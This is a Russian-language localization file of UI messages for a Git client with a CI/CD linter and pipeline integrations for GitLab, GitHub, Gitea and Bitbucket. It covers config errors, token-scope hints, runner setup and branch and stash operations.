circleci-wont-run-job-job = CircleCI не запустит задание: «Job '{ $a0 }' has no executor (docker, machine, macos or executor)».
job-needs-execution-environment = Заданию нужна среда выполнения.
circleci-wont-run-job-steps = CircleCI не запустит задание: «steps is required».
no-checkout-step = { $a0 }: нет шага checkout
commands-will-fail-there-are = Команды упадут: файлов репозитория в контейнере нет.
code-appears-only-after-checkout = Код появляется только после шага checkout.
right-on-push-azure-devops = Сразу при push — Azure DevOps проверяет файл до запуска
dependson-on-unknown = { $a0 }: dependsOn на неизвестное { $a1 }
azure-wont-run-pipeline-job = Azure не запустит пайплайн: «Job { $a0 } depends on unknown job { $a1 }».
stage-dependson-on-unknown = Этап { $a0 }: dependsOn на неизвестный { $a1 }
azure-wont-run-pipeline-stage = Azure не запустит пайплайн: «Stage { $a0 } depends on unknown stage { $a1 }».
theres-no-stage = Этапа { $a0 } нет.{ $a1 }
pool-isnt-specified = Не указан pool
projects-default-pool-will-be = Будет использован пул по умолчанию проекта — если в нём нет агентов, задание будет ждать бесконечно.
pool-isnt-set-in-file = pool не задан ни в файле, ни в заданиях.

## crates/gorynych-ci-linter/src/check/scripts.rs

job-2 = задание { $a0 }
when-runs = При выполнении { $a0 } { $a1 }
jobs = задания
script-of-has-in-plain = В скрипте { $a0 } открытым текстом { $a1 }
value-will-end-up-in = Значение попадёт в историю Git и в логи заданий — его увидит любой, у кого есть доступ к репозиторию или к логам.
secrets-in-ci-file-arent = Секреты в файле CI не скрываются: маскируются только переменные из настроек проекта.
revoke-this-key-token-and = Отзовите этот ключ/токен и создайте новый; храните его в защищённой переменной (Settings → CI/CD → Variables, masked) и используйте как $ИМЯ.
cd-no-such-folder-in = cd { $a0 }: такой папки в репозитории нет
job-will-fail-on-this = Задание упадёт на этой строке: «{ $a0 }: cd: { $a1 }: No such file or directory».
folder-isnt-among-repository-files = Папки { $a0 } нет среди файлов репозитория, и раньше в задании её никто не создаёт.
check-path-letter-case-matters = Проверьте путь (регистр букв важен на Linux) или создайте папку раньше (mkdir -p) / получите её артефактом из предыдущего задания.
in-image = { $a0 } в образе { $a1 }
job-will-fail-not-found = Задание упадёт: «{ $a0 }: { $a1 }: not found».
is-alpine-linux-image-it = { $a0 } — образ на Alpine Linux, там пакетный менеджер apk, а { $a1 } нет.
use-apk-add-no-cache = Используйте apk add --no-cache … или образ на Debian/Ubuntu (без «-alpine» в теге).
apk-in-image = apk в образе { $a0 }
job-will-fail-apk-not = Задание упадёт: «{ $a0 }: apk: not found».
is-based-on-debian-ubuntu = { $a0 } основан на Debian/Ubuntu — там apt-get, а apk есть только в Alpine.
replace-it-with-apt-get = Замените на apt-get update && apt-get install -y … или возьмите вариант образа с «-alpine».
bash-in-image = bash в образе { $a0 }
sh-bash-not-found-alpine = «sh: bash: not found» — в Alpine по умолчанию только sh (ash).
alpine-images-are-minimal-bash = Образы Alpine минимальные: bash в них не установлен.
run-it-via-sh-or = Запускайте через sh или добавьте apk add --no-cache bash перед этим.
image-has-no = { $a0 }: в образе { $a1 } нет { $a2 }
job-will-most-likely-fail = Скорее всего задание упадёт: «{ $a0 }: { $a1 }: not found» (код 127).
node-images-have-npm-and = В образах node есть npm и yarn, а pnpm нужно включить отдельно.
official-image-doesnt-contain-and = Официальный образ { $a0 } не содержит { $a1 }, и раньше в задании он не устанавливается.
add-corepack-enable-or-npm = Добавьте перед этим corepack enable (или npm i -g pnpm).
take-image-with-or-install = Возьмите образ с { $a0 } или установите его раньше в скрипте.
docker-without-docker-daemon = docker { $a0 } без Docker-демона
on-runner-with-docker-executor = На раннере с Docker executor задание упадёт: «Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?»
job-container-has-only-docker = В контейнере задания есть только клиент docker (если он вообще есть), а сам демон не запущен: нет services: docker:dind и не задан DOCKER_HOST.
add-services-docker-dind-and = Добавьте services: [docker:dind] и variables: DOCKER_TLS_CERTDIR: "/certs" (образ docker:…), либо используйте раннер с shell executor / сокетом docker, либо kaniko/buildah.
file-isnt-in-repository-3 = { $a0 }: файла нет в репозитории
job-will-fail-not-found-or = Задание упадёт: «{ $a0 }: { $a1 }: not found» (или No such file or directory).
file-isnt-among-repository-files = Файла { $a0 } нет среди файлов репозитория и его не создаёт ни это задание, ни артефакты предыдущих.
check-path-and-letter-case = Проверьте путь и регистр букв; если файл генерируется — передайте его артефактом (artifacts + needs/dependencies).
file-isnt-executable = { $a0 }: у файла нет права на запуск
job-will-fail-permission-denied = Задание упадёт: «{ $a0 }: { $a1 }: Permission denied» (код 126).
in-git-file-is-saved = В Git файл { $a0 } сохранён без флага исполняемости (режим 100644) — так бывает, если его добавили в Windows.
run-git-update-index-chmod = Выполните git update-index --chmod=+x { $a0 } и закоммитьте; или запускайте через интерпретатор: sh { $a1 }.
file-isnt-in-repository-4 = { $a0 } { $a1 }: файла нет в репозитории
job-will-fail-error-cannot = Задание упадёт: «Error: Cannot find module '…/{ $a0 }'».
job-will-fail-cant-open = Задание упадёт: «can't open file '{ $a0 }': [Errno 2] No such file or directory».
job-will-fail-no-such = Задание упадёт: «{ $a0 }: No such file or directory».
file-isnt-in-repository-taking = Файла { $a0 } нет в репозитории (с учётом предыдущих cd).
check-path-and-letter-case-or = Проверьте путь и регистр букв или передайте файл артефактом из задания, которое его создаёт.
root = корне
no-package-json-in = { $a0 }: нет package.json в { $a1 }
will-fail-package-json-not = { $a0 } завершится ошибкой: не найден package.json.
command-runs-in-folder-and = Команда выполняется в папке { $a0 }, а package.json там нет.
go-to-project-folder-cd = Перейдите в папку проекта (cd …) или поправьте путь.
npm-ci-without-package-lock = npm ci без package-lock.json
has-no-package-lock-json = В { $a0 } нет package-lock.json — его не закоммитили (или он в .gitignore).
commit-package-lock-json-npm = Закоммитьте package-lock.json (npm install локально создаст его) или замените npm ci на npm install.
no-such-script-in-package = { $a0 } { $a1 }{ $a2 }: такого скрипта нет в package.json
scripts-section-of-has = В { $a0 } в разделе scripts есть: { $a1 }.
nothing = ничего
add-to-scripts-or-fix = Добавьте "{ $a0 }" в scripts или поправьте имя.{ $a1 }
similar = {" "}Похожие: { $a0 }.
yarn-with-frozen-lockfile-without = yarn с --frozen-lockfile без yarn.lock
has-no-yarn-lock = В { $a0 } нет yarn.lock.
commit-yarn-lock-or-remove = Закоммитьте yarn.lock или уберите флаг.
pnpm-install-without-pnpm-lock = pnpm install без pnpm-lock.yaml
in-ci-pnpm-uses-frozen = В CI pnpm по умолчанию работает с --frozen-lockfile: «ERR_PNPM_NO_LOCKFILE Cannot install with "frozen-lockfile" because pnpm-lock.yaml is absent».
has-no-pnpm-lock-yaml = В { $a0 } нет pnpm-lock.yaml.
commit-pnpm-lock-yaml-or = Закоммитьте pnpm-lock.yaml или добавьте --no-frozen-lockfile.
pip-install-r-no-such = pip install -r { $a0 }: файла нет
check-name-requirements-txt-requirements = Проверьте имя (requirements.txt / requirements-dev.txt) и папку.
poetry-install-without-pyproject-toml = poetry install без pyproject.toml
has-no-pyproject-toml = В { $a0 } нет pyproject.toml.
go-to-project-folder-or = Перейдите в папку проекта или добавьте pyproject.toml.
make-no-makefile-in = make: нет Makefile в { $a0 }
has-no-makefile = В { $a0 } нет Makefile.
add-makefile-or-go-to = Добавьте Makefile или перейдите в нужную папку (make -C папка …).
no = нет
make-no-such-target-in = make { $a0 }: такой цели нет в { $a1 }
has-targets = В { $a0 } есть цели: { $a1 }.
fix-target-name-or-add = Поправьте имя цели или добавьте её в Makefile.
mvn-no-pom-xml = mvn: нет pom.xml
gradle-no-build-gradle = gradle: нет build.gradle
gradle-wont-find-build-directory = Gradle не найдёт сборку: «Directory … does not contain a Gradle build».
go-no-go-mod = go: нет go.mod
cargo-no-cargo-toml = cargo: нет Cargo.toml
composer-no-composer-json = composer: нет composer.json
bundle-no-gemfile = bundle: нет Gemfile
dotnet-no-project-sln-csproj = dotnet: нет проекта (.sln / .csproj)
has-no = В { $a0 } нет { $a1 }.
go-to-project-folder-cd-or = Перейдите в папку проекта (cd …) или проверьте путь.
docker-build-no = docker build: нет { $a0 }
specify-right-path-with-f = Укажите правильный путь через -f или поправьте контекст сборки.
docker-compose-f-no-such = docker compose -f { $a0 }: файла нет
kubectl-f-no-such-file = kubectl { $a0 } -f { $a1 }: файла нет

## crates/gorynych-ci-linter/src/check/tags.rs

online = в сети
busy = занят
offline = не в сети
paused = на паузе
and-more = {" "}и ещё { $a0 }
no-runner-picks-up-untagged = Нет раннера, который берёт задания без тегов
all-runners-for-untagged-jobs = Все раннеры для заданий без тегов не в сети или на паузе
on-run = При запуске { $a0 }
job-will-hang-in-queue = Задание повиснет в очереди (Pending): «This job is stuck because the project doesn’t have any runners online assigned to it».
all-project-runners-have-run = У всех раннеров проекта выключено «Run untagged jobs».
matching = Подходят: { $a0 }
add-tags-live-runners-tag = Добавьте заданию tags: [<тег живого раннера>] или включите раннеру «Брать задания без тегов».
tag = тегом "{ $a0 }"
tag-set = набором тегов { $a0 }
tags = тегами { $a0 }
runners-with-these-tags-exist = Раннеры с этими тегами есть, но { $a0 }.
each-tag-belongs-to-some = Каждый тег есть у какого-то раннера в сети, но ни у одного — все сразу: задание берёт только раннер, у которого есть все перечисленные теги.
no-online-runner-has = Ни у одного раннера в сети нет { $a0 }.
this-tag = этого тега
these-tags = этих тегов
no-active-runners-with-pipeline = Нет активных раннеров с { $a0 } — пайплайн зависнет в очереди (Pending)!
job-will-wait-in-queued = Задание будет ждать в статусе Queued, пока не появится подходящий раннер (до 24 часов), затем отменится.
check-tags-for-typos-or = Проверьте опечатки в тегах или подключите раннер с этими тегами (вкладка «Раннеры» → «Подключить раннер»).
start-or-unpause-matching-runner = Запустите или снимите с паузы подходящий раннер (вкладка «Раннеры»).

## crates/gorynych-ci-linter/src/edit/file.rs

gitlab-ci-pipeline-stages-run =
    # Пайплайн GitLab CI: этапы выполняются по порядку, задания одного этапа — параллельно
    stages: [build, test, deploy]
    {""}
    default:
    {"  "}image: node:20
    {""}
    build:
    {"  "}stage: build
    {"  "}script:
    {"    "}- npm ci
    {"    "}- npm run build
    {"  "}artifacts:
    {"    "}paths: [dist/]
    {""}
    test:
    {"  "}stage: test
    {"  "}script:
    {"    "}- npm ci
    {"    "}- npm test
    {""}
    deploy:
    {"  "}stage: deploy
    {"  "}script:
    {"    "}- echo "Деплой"
    {"  "}rules:
    {"    "}- if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
    {"      "}when: manual
    {""}
writing-here-isnt-allowed = Сюда писать нельзя
only-ci-cd-files-yml = Сохранять можно только файлы CI/CD (.yml, .yaml, Jenkinsfile)
file-is-too-large = Файл слишком большой
file-changed-on-disk-while = Файл изменился на диске, пока вы его редактировали
click-reload-to-load-fresh = Нажмите «Перечитать», чтобы загрузить свежую версию, или сохраните поверх (ваши правки заменят изменения на диске).
no-template-for-this-system = Нет шаблона для этой системы
file-already-exists = Файл { $a0 } уже существует

## crates/gorynych-ci-linter/src/edit/ops.rs

job-not-found-in-this = Задание «{ $a0 }» не найдено в этом файле
job-3 = задание
stage = этап
enter-name = Введите имя ({ $a0 })
name-is-too-long = Слишком длинное имя
name-cant-contain-line-break = Имя не может содержать перевод строки
is-reserved-word-in-gitlab = «{ $a0 }» — зарезервированное слово GitLab CI
job-already-exists = Задание «{ $a0 }» уже есть
job-must-have-at-least = У задания должен быть хотя бы один шаг script
invalid-when-value = Недопустимое значение when: { $a0 }
removed-from = «{ $a0 }»: убрано из { $a1 }
reference-updated-in = «{ $a0 }»: обновлена ссылка в { $a1 }
field-cant-be-changed-here = Поле { $a0 } нельзя менять здесь
stage-added-to-stages = Этап «{ $a0 }» добавлен в stages
stage-already-exists = Этап «{ $a0 }» уже есть
stage-not-found-in-stages = Этап «{ $a0 }» не найден в stages
jobs-moved = Перенесено заданий: { $a0 }
stage-has-jobs = В этапе «{ $a0 }» есть задания: { $a1 }
move-or-delete-these-jobs = Сначала перенесите или удалите эти задания
unknown-edit = Неизвестная правка
file-has-yaml-errors-fix = В файле есть ошибки YAML — сначала исправьте их во вкладке «Файл»
file-must-be-mapping-key = Файл должен быть словарём (key: value) на верхнем уровне

## crates/gorynych-ci-linter/src/edit/text.rs

couldnt-apply-edit-without-rewriting = Не удалось внести правку, не переписывая файл
make-this-change-by-hand = Внесите это изменение вручную во вкладке «Файл»

## crates/gorynych-ci-linter/src/load/actions.rs

parameters = параметры: { $a0 }
after = после: { $a0 }
step-4 = Шаг { $a0 }
min = { $a0 } мин
file-has-no-jobs-section = В файле нет раздела jobs
needs-refers-to-which-doesnt = «{ $a0 }»: needs ссылается на «{ $a1 }», которого нет
run-name = Имя запуска
token-permissions = Права токена
when-it-runs-on = Когда запускается (on)

## crates/gorynych-ci-linter/src/load/common.rs

file-is-too-large-kb = Файл { $a0 } слишком большой ({ $a1 } КБ)
if = если { $a0 }
changed = изменены { $a0 }
exists = существует { $a0 }
in-all-other-cases = во всех остальных случаях
start = Старт
after-step = После шага { $a0 }

## crates/gorynych-ci-linter/src/load/gitlab.rs

extends-refers-to-unknown-job = «{ $a0 }»: extends ссылается на неизвестное задание «{ $a1 }»
reference-refers-to-something-that = !reference [{ $a0 }] ссылается на то, чего нет
couldnt-read = Не удалось прочитать { $a0 }: { $a1 }
include-is-nested-too-deeply = Слишком глубокая вложенность include
file-not-found-in-repository = Файл не найден в репозитории
needs-refers-to-job-which = «{ $a0 }»: needs ссылается на задание «{ $a1 }», которого нет
stage-isnt-declared-in-stages = «{ $a0 }»: этап «{ $a1 }» не объявлен в stages — GitLab не запустит пайплайн
pipeline-name = Название пайплайна
default-image = Образ по умолчанию
runner-tags = Теги раннеров
when-pipeline-is-created-workflow = Когда создаётся пайплайн (workflow:rules)
pipeline = Пайплайн
global = глобально
times = { $a0 } раз

## crates/gorynych-ci-linter/src/load/jenkins.rs

parallel = { $a0 } · параллельно
agent = Агент
syntax = Синтаксис
couldnt-find-stage-blocks-showing = Не удалось найти этапы stage(...) — показан только файл
triggers = Триггеры

## crates/gorynych-ci-linter/src/load/pipelines.rs

concurrency = Параллельно
default-all-branches = default — все ветки
services = Сервисы
pipelines-section-not-found = Не найден раздел pipelines
pipelines = Пайплайны
jobs-2 = Задания
config-version = Версия конфига
job-4 = Задание
steps = Шаги
disabled = выключен
pool = Пул
when-it-runs = Когда запускается
sections = Разделы

## crates/gorynych-cicd/src/detect_server.rs

didnt-respond-within-s = { $a0 } не ответил за { $a1 } с
no-connection-to = Нет связи с { $a0 }

## crates/gorynych-cicd/src/gitlab/api.rs

invalid-pipeline-number = Некорректный номер пайплайна
pipeline-not-found-it-may = Пайплайн #{ $a0 } не найден — возможно, его удалили
invalid-job-number = Некорректный номер задания
job-not-found-it-may = Задание #{ $a0 } не найдено — возможно, его удалили
unknown-action = Неизвестное действие
no-branch-specified = Не указана ветка
invalid-number = Некорректный номер
read-only-token = Токен только для чтения
running-and-canceling-require-token = Для запуска и отмены нужен токен со scope «api» — создайте новый и сохраните его
invalid-variable-name = Некорректное имя переменной
variable-not-found-it-may = Переменная { $a0 } не найдена — возможно, её удалили
no-content = Нет содержимого
this-gitlab-server-doesnt-support = Этот сервер GitLab не поддерживает проверку CI по API (нужен GitLab 13.6 или новее)
variable-name-only-latin-letters = Имя переменной: только латинские буквы, цифры и _
value-is-too-long = Значение слишком длинное
enter-value = Введите значение
value-of-hidden-variable-cant = Значение скрытой переменной нельзя прочитать — введите его заново
variable-is-already-deleted = Переменная { $a0 } уже удалена
enter-schedule-description = Введите описание расписания
choose-branch = Выберите ветку
invalid-cron-format = Неверный формат cron
five-space-separated-fields-minute = Пять полей через пробел: минуты часы день месяц день_недели, например «0 3 * * *»
schedule-not-found-it-may = Расписание не найдено — возможно, его удалили
invalid-schedule-number = Некорректный номер расписания
source-branch = исходная ветка
target-branch = целевая ветка
no-specified = Не указана { $a0 }
source-and-target-branches-are = Исходная и целевая ветки совпадают
push-branch-to-server-first = Сначала отправьте ветку на сервер (Push).

## crates/gorynych-cicd/src/gitlab/auth.rs

pipeline-token-in-repository-sign = Токен для пайплайнов в авторизации репозитория
repository-sign-in-token = Токен авторизации репозитория
doesnt-work-for-pipelines = { $a0 } не подходит для пайплайнов: { $a1 }.
repository-is-signed-in-with = Репозиторий авторизован SSH-ключом — его принимает git, но не API GitLab. Добавьте в авторизацию репозитория токен для пайплайнов.
repository-sign-in-password-cant = Пароль авторизации репозитория не расшифровывается — авторизуйтесь заново.
repository-is-signed-in-with-username = Репозиторий авторизован логином и паролем — API GitLab принимает только токены. Добавьте в авторизацию репозитория токен для пайплайнов.
token-has-no-api-scope = у токена нет права на API: есть только { $a0 }, а нужен «api» или «read_api»
token-has-no-api-scope-api = у токена нет права на API (нужен scope «api» или «read_api»)
gitlab-doesnt-accept-this-token = GitLab не принимает этот токен для API — он отозван, истёк или это не личный токен
server-didnt-respond = сервер не ответил

## crates/gorynych-cicd/src/gitlab/http.rs

already-exists = уже существует
cant-be-empty = не может быть пустым
invalid-value = недопустимое значение
too-long = слишком длинное
too-short = слишком короткое
cant-be-masked = нельзя замаскировать
name = Имя
value-2 = Значение
schedule-cron = Расписание (cron)
time-zone = Часовой пояс
branch = Ветка
description = Описание
environment = Окружение
gitlab-rejected-request = GitLab отклонил запрос
cron-format-minute-hour-day = Формат cron: «минуты часы день месяц день_недели», например «0 3 * * *» — каждый день в 3:00
variable-name-latin-letters-digits = Имя переменной: латинские буквы, цифры и _
masked-value-one-line-at = Маскированное значение: одна строка, не короче 8 символов, только буквы, цифры и символы @ : . ~ - _ + / =
check-internet-vpn-and-gitlab = Проверьте интернет, VPN и адрес сервера GitLab
gitlab-didnt-respond-within-s = GitLab не ответил за { $a0 } с
gitlab-rejected-token = GitLab отклонил токен
token-is-wrong-revoked-or = Токен неверный, отозван или истёк — создайте новый и сохраните его заново
insufficient-permissions = Недостаточно прав
token-lacks-required-scope-actions = У токена нет нужного права (scope). Для действий нужен scope «api», для просмотра — «read_api»
your-role-in-project-doesnt = Ваша роль в проекте не позволяет это действие
not-found-in-gitlab = Не найдено в GitLab
project-doesnt-exist-or-token = Проект не существует или у токена нет к нему доступа
gitlab-rate-limited-requests-try = GitLab ограничил частоту запросов — попробуйте через минуту
gitlab-returned-error = GitLab вернул ошибку { $a0 }

## crates/gorynych-cicd/src/gitlab/light.rs

gitlab-rate-limited-requests = GitLab ограничил частоту запросов
gitlab-returned = GitLab вернул { $a0 }

## crates/gorynych-cicd/src/gitlab/mod.rs

changes-require-token-with-api = Для изменений нужен токен со scope «api» — создайте новый и сохраните его в настройках
repository-has-no-remote = У репозитория нет remote
remote-doesnt-look-like-gitlab = Remote не похож на GitLab
if-its-your-own-gitlab = Если это свой сервер GitLab — сохраните для него токен в настройках
repository-sign-in-doesnt-work = Авторизация репозитория не подходит для пайплайнов
repository-isnt-signed-in = Репозиторий не авторизован
sign-in-to-repository-same = Авторизуйте репозиторий — эта же авторизация работает и для пайплайнов

## crates/gorynych-cicd/src/http.rs

check-internet-vpn-and-api = Проверьте интернет, VPN и адрес API { $a0 }
didnt-accept-repository-sign-in = { $a0 } не принял авторизацию репозитория
token-is-wrong-revoked-or-expired = Токен неверный, отозван или истёк — обновите авторизацию репозитория
rate-limited-requests-try-again = { $a0 } ограничил частоту запросов — попробуйте позже
token-lacks-required-permission-or = У токена нет нужного права или ваша роль в репозитории не позволяет это действие
not-found-on = Не найдено в { $a0 }
repository-doesnt-exist-token-has = Репозиторий не существует, у токена нет к нему доступа или { $a0 } не поддерживает этот запрос
rejected-request = { $a0 } отклонил запрос
rate-limited-requests-try-again-in = { $a0 } ограничил частоту запросов — попробуйте через минуту
returned-error = { $a0 } вернул ошибку { $a1 }

## crates/gorynych-cicd/src/models.rs

doesnt-allow-this-via-api = { $a0 } не даёт этого сделать через API

## crates/gorynych-cicd/src/providers/bitbucket.rs

bitbucket-doesnt-expose-runners-in = Bitbucket не открывает раннеры в публичном API — управляйте ими в настройках репозитория (Repository settings → Runners)
bitbucket-doesnt-provide-pipeline = Bitbucket не отдаёт артефакты пайплайна через публичный API
bitbucket-runner-is-registered-in = Раннер Bitbucket регистрируется в настройках репозитория — команда запуска показывается там
bitbucket-data-center-doesnt-support = Bitbucket Data Center не поддерживает Pipelines
on-self-hosted-bitbucket-builds = На своём сервере Bitbucket сборки обычно идут в Bamboo или Jenkins
repository-not-found-or-sign = Репозиторий { $a0 }/{ $a1 } не найден или у входа нет к нему доступа
pipeline-not-found = Пайплайн #{ $a0 } не найден
no-pipeline-specified-for-step = Не указан пайплайн шага
bitbucket-doesnt-support-this-action = Bitbucket не поддерживает это действие
invalid-variable-name-2 = Некорректное имя переменной: { $a0 }
bitbucket-doesnt-expose-runners-in-its = Bitbucket не открывает раннеры в публичном API
variable-not-found = Переменная { $a0 } не найдена

## crates/gorynych-cicd/src/providers/gitea.rs

in-gitea-runner-labels-are = В Gitea метки раннера задаются при регистрации (act_runner register --labels) или в его config.yaml
gitea-has-no-runner-pause = В Gitea нет паузы раннера — остановите act_runner на сервере
gitea-doesnt-allow-changing-runner = Gitea не даёт менять настройки раннера через API
run-not-found = Запуск #{ $a0 } не найден
gitea-doesnt-allow-canceling-or = Gitea не даёт отменять и перезапускать запуски через API
open-run-in-browser = Откройте запуск в браузере
choose-workflow-to-run = Выберите workflow для запуска
running-workflow-via-api-is = Запуск workflow по API поддерживается в Gitea 1.23 и новее (и workflow должен быть отправлен на сервер)
runner-list-api-is-available = Список раннеров по API есть в Gitea 1.24 и новее
gitea-doesnt-allow-changing-runner-via = Gitea не даёт менять раннер через API
labels-are-set-in-runners = Метки задаются в config.yaml раннера или при регистрации
runner-is-already-deleted-or = Раннер уже удалён или Gitea не поддерживает удаление по API

## crates/gorynych-cicd/src/providers/github.rs

repository-not-found-or-token = Репозиторий { $a0 }/{ $a1 } не найден или у токена нет к нему доступа
github-runs-workflow-only-with = GitHub запускает workflow только с входными параметрами (inputs) — переменные окружения задаются в самом workflow
github-has-no-runner-pause = У GitHub нет паузы раннера — остановите службу раннера на сервере
runners-and-secrets-are-visible = Раннеры и секреты видны только администраторам репозитория
run-not-found-it-may = Запуск #{ $a0 } не найден — возможно, его удалили
job-not-found = Задание #{ $a0 } не найдено
github-doesnt-support-this-action = GitHub не поддерживает это действие
workflow-not-found-on-server = Workflow { $a0 } не найден на сервере — он закоммичен и отправлен в ветку по умолчанию?
github-doesnt-allow-changing-these = GitHub не позволяет менять эти настройки раннера
runner-is-already-deleted = Раннер уже удалён

## crates/gorynych-cicd/src/providers/gitlab.rs

read-only-token-read-api = Токен только для чтения (read_api) — для действий нужен scope «api»
project-runners-can-be-changed = Раннеры проекта меняет роль Maintainer и выше
running-needs-token-with-api = Для запуска нужен токен со scope «api»
only-latin-letters-digits-and = Только латинские буквы, цифры и _
maximum-timeout-is-at-least = Максимальный тайм-аут — не меньше 600 секунд (10 минут)
runner-without-tags-must-pick = Раннер без тегов должен брать задания без тегов
add-tag-or-turn-on = Добавьте тег или включите «Брать задания без тегов»
runner-not-found-or-you = Раннер не найден или у вас нет прав его менять
runner-not-found-it-may = Раннер не найден — возможно, его уже удалили
git-gorynych = git-Горыныч
couldnt-get-runner-token = Не удалось получить токен раннера
maintainer-role-in-project-is = Нужна роль Maintainer в проекте
jobs-artifacts-were-deleted-or = Артефакты задания удалены или истекли

## crates/gorynych-cicd/src/runner_setup.rs

latest-act-runner-version-https = # Свежая версия act_runner: https://gitea.com/gitea/act_runner/releases
docker-isnt-installed = Docker не установлен
install-docker-desktop-and-start = Установите Docker Desktop и запустите его
local-runner-isnt-supported-for = Локальный раннер для этого провайдера не поддерживается
docker-isnt-running = Docker не запущен
start-docker-desktop-and-try = Запустите Docker Desktop и попробуйте снова
docker-returned-error = Docker вернул ошибку
this-isnt-app-runner = Это не раннер приложения

## crates/gorynych-cicd/src/seal.rs

invalid-repository-public-key = Некорректный открытый ключ репозитория

## crates/gorynych-cicd/src/service.rs

repository-sign-in-doesnt-work-for = Авторизация репозитория не подходит для { $a0 }: { $a1 }{ $a2 }
repository-is-signed-in-with-ssh = Репозиторий авторизован SSH-ключом — его принимает git, но не API { $a0 }. Добавьте в авторизацию репозитория токен для пайплайнов.
unavailable = { $a0 }: { $a1 } недоступно
token-needs-repo-and-workflow = Токену нужны права repo и workflow (классический) или Actions, Administration и Secrets (fine-grained)
token-needs-write-repository-and = Токену нужны права write:repository (и read:user)
bitbucket-api-token-needs-read = API-токену Bitbucket нужны права read:repository:bitbucket и read:pipeline:bitbucket, для действий — write:pipeline:bitbucket
app-password-needs-pipelines-read = Паролю приложения нужны права Pipelines: Read/Write и Repositories: Read
couldnt-determine-ci-cd-service = Не удалось определить сервис CI/CD
set-provider-gitlab-github-gitea = Укажите провайдера (GitLab, GitHub, Gitea, Bitbucket) и адрес API в настройках CI/CD репозитория
sign-in-to-repository-same-sign = Авторизуйте репозиторий — эта же авторизация работает и для { $a0 }
repository-sign-in-doesnt-work-for-ci = Авторизация репозитория не подходит для CI/CD
action = действие
run = запуск
variables-at-run-time-arent = Переменные при запуске не поддерживаются
by-branch-branches-default = По ветке (branches / default)
runners-unavailable = Раннеры недоступны
changing-labels = изменение меток
pause = пауза
runner-settings = настройки раннера
deleting-runner = удаление раннера
deleting-runners = удаление раннеров
registering-runner = регистрация раннера
local-runner = локальный раннер
git-gorynych-local-docker = git-Горыныч (локальный Docker)
no-artifact-or-file-specified = Не указан артефакт или файл
downloading-artifacts = скачивание артефактов
secrets = секреты
name-latin-letters-digits-and = Имя: латинские буквы, цифры и _, не с цифры
names-starting-with-github-are = Имена с GITHUB_ зарезервированы
value-is-larger-than-48 = Значение больше 48 КБ

## crates/gorynych-core/src/error.rs

install-git-for-windows-git = Установите Git for Windows (git-scm.com). Если Git уже установлен — полностью закройте терминал/VS Code,{" "}
app-was-started-from-and = из которого запускали приложение, и откройте заново: старые окна не видят обновлённый PATH.
git-not-found = Git не найден
operation-timed-out = Операция прервана по таймауту
server-didnt-respond-in-time = Сервер не ответил вовремя, либо Git ждал ввода логина. Попробуйте ещё раз.
git-error = Ошибка Git

## crates/gorynych-core/src/paths.rs

invalid-path = Некорректный путь
path-is-outside-repository = Путь вне репозитория

## crates/gorynych-git/src/actions/checkout.rs

there-are-unresolved-conflicts-in = В рабочей папке есть неразрешённые конфликты
resolve-them-first-then-switch = Сначала решите их, затем переключайтесь.
changes-came-back-with-conflicts = Изменения вернулись с конфликтами — stash сохранён
branch-not-found = Ветка «{ $a0 }» не найдена
it-may-have-been-deleted = Возможно, её удалили — обновите список (Fetch)
unknown-strategy = Неизвестная стратегия: { $a0 }
there-are-uncommitted-changes-in = В рабочей папке есть незакоммиченные изменения ({ $a0 })
choose-what-to-do-with = Выберите, что с ними сделать: спрятать, перенести в новую ветку или выбросить.

## crates/gorynych-git/src/actions/history.rs

cant-undo-has-changed-since = Нельзя отменить: { $a0 } изменилось после операции
repository-was-changed-outside-app = Репозиторий изменился вне приложения или другой операцией.
branch-2 = ветка { $a0 }
stash-list = список сташей
cant-go-back-it-was = Нельзя вернуться: до переключения был detached HEAD
repositorys-first-commit-cant-be = Первый коммит репозитория отменить нельзя
commit-has-already-been-pushed = Коммит уже отправлен на remote — отмена переписала бы общую историю
use-revert-coming-later = Используйте revert (будет добавлен позже).
there-are-already-changes-in = В рабочей папке уже есть изменения
commit-or-stash-them-then = Закоммитьте или спрячьте их, затем повторите Undo.
tag-2 = тег { $a0 }
unknown-which-commit-branch-was = Не известно, на каком коммите была ветка
branch-commit-isnt-available-locally = Коммита ветки нет локально — вернуть на сервер нельзя
fetch-on-teammates-machine-or = Сделайте fetch у коллеги или восстановите ветку на сервере.

## crates/gorynych-git/src/actions/mod.rs

unknown-action-2 = Неизвестное действие: { $a0 }
nothing-to-undo = Нечего отменять
nothing-to-redo = Нечего повторять
checkout-with-changes-moved = Checkout { $a0 } с переносом изменений
checkout-discarding-changes = Checkout { $a0 } без изменений
with-conflict-resolution = { $a0 } (с решением конфликтов)
create-branch = Создание ветки { $a0 }
delete = Удаление { $a0 }
return-to = Возврат к { $a0 }
tag-3 = Тег { $a0 }
delete-tag = Удаление тега { $a0 }
delete-from-server = Удаление { $a0 }/{ $a1 } с сервера
rename = Переименование { $a0 } → { $a1 }
delete-branch = Удаление ветки { $a0 }
rebase-onto = Rebase на { $a0 }
before = до
from = из
file-version = Файл { $a0 } → версия { $a1 } { $a2 }
file = файл
files = файлов
from-2 = Из { $a0 }: { $a1 } { $a2 }
revert-part-of-commit = Откат фрагмента коммита
discard-changes = Удаление правок
hunk-from-stash = Фрагмент из stash
into = { $a0 } в { $a1 }
update = Обновление { $a0 }

## crates/gorynych-git/src/actions/ops.rs

enter-branch-name = Введите имя ветки
invalid-branch-name = Недопустимое имя ветки: «{ $a0 }»
spaces-and-are-not-allowed = Нельзя использовать пробелы, «..», «~», «^», «:», «?», «*», «[» и «\».
branch-already-exists = Ветка «{ $a0 }» уже существует
make-first-commit-first = Сначала сделайте первый коммит
invalid-commit = Некорректный коммит
not-found-2 = Не найдено: { $a0 }
check-branch-name-or-fetch = Проверьте имя ветки или сделайте Fetch.
unclosed-quote-in-command = Незакрытая кавычка в команде
empty-command = Пустая команда
no-changes-to-stash = Нет изменений для stash
stash-is-unavailable-until-first = Stash недоступен до первого коммита
no-stashes = Нет сташей
invalid-stash = Некорректный stash
stash-not-found-list-has = Stash не найден — список изменился
stash-list-has-changed-refresh = Список stash изменился — обновите и повторите
enter-tag-name = Введите имя тега
invalid-tag-name = Недопустимое имя тега: «{ $a0 }»
tag-already-exists = Тег «{ $a0 }» уже существует
tag-not-found = Тег «{ $a0 }» не найден
enter-new-branch-name = Укажите новое имя ветки
name-hasnt-changed = Имя не изменилось
no-spaces-or = Без пробелов, «..», «~», «^», «:», «?», «*», «[» и «\».
